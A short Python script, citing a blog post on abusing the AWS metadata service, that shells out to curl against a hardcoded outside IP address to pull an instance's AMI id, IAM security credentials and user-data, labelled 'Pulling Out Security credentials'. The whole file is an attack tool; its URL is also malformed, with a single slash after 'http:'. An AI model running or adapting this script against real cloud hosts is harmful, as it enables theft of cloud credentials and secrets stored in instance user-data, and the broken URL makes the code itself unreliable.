#!/usr/bin/env python3
#https://www.emergingdefense.com/blog/2019/1/16/abusing-aws-metadata-service
import os

def metadata_endpoint(metadata):
    os.system("curl http:/52.221.208.10" + metadata)
    print()

print(" AMI Information id")
metadata_endpoint("/latest/meta-data/ami-id")

print("Pulling Out Security credentials")
metadata_endpoint("/latest/meta-data/iam/security-credentials/")

print("script")
metadata_endpoint("/latest/user-data/")

metadata_endpoint